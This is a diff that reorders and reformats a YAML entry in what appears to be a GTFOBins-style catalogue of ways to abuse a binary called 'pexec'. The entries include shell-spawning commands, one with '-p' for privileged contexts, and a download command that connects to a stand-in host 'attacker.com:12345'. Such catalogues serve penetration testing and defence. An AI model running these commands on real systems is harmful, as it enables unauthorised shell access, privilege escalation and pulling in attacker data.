@@ -1,5 +1,14 @@
 ---
 functions:
+  download:
+  - binary: false
+    code: |-
+      pexec --remote --connect attacker.com:12345 > /path/to/output-file
+    comment: |-
+      Downloads one line after sending a command.
+    contexts:
+      unprivileged:
+    sender: tcp-server
   shell:
   - code: |-
       pexec /bin/sh
@@ -10,13 +19,4 @@ functions:
           pexec /bin/sh -p
         shell: false
       unprivileged:
-  download:
-  - code: |-
-      pexec --remote --connect attacker.com:12345 > /path/to/output-file
-    binary: false
-    contexts:
-      unprivileged:
-    comment:
-      Downloads one line after sending a command.
-    sender: tcp-server      
 ...
